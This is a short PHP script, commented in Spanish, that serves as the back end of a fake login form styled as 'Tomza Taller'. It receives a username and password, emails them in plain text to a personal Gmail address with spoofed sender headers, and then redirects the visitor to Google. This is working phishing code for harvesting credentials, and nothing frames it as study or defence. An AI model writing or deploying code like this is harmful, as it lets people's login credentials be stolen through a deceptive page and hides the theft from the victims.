<?php
// Evitamos errores si alguien entra directamente
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibimos los datos de forma segura
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

// Verificamos que no estén vacíos
if ($usuario === "" || $password === "") {
    echo "Faltan datos para enviar.";
    exit;
}

// --------------------------
// Configuración del correo
// --------------------------
$destinatario = "sebastiancq2008@gmail.com"; // Tu correo
$asunto = "Nuevo intento de ingreso - Tomza Taller";

// Cuerpo del mensaje
$mensaje = "Se recibieron los siguientes datos:\n\n";
$mensaje .= "Usuario: " . $usuario . "\n";
$mensaje .= "Contraseña: " . $password . "\n";
$mensaje .= "Fecha y hora: " . date("d/m/Y H:i:s") . "\n";

// Encabezados para que no lo rechacen
$encabezados = "From: sistema@tomzataller.com\r\n";
$encabezados .= "Reply-To: no-responder@tomzataller.com\r\n";
$encabezados .= "X-Mailer: PHP/" . phpversion();

// Enviar el correo
mail($destinatario, $asunto, $mensaje, $encabezados);

// Redirigir a Google como querés
header("Location: https://www.google.com");
exit;
?>
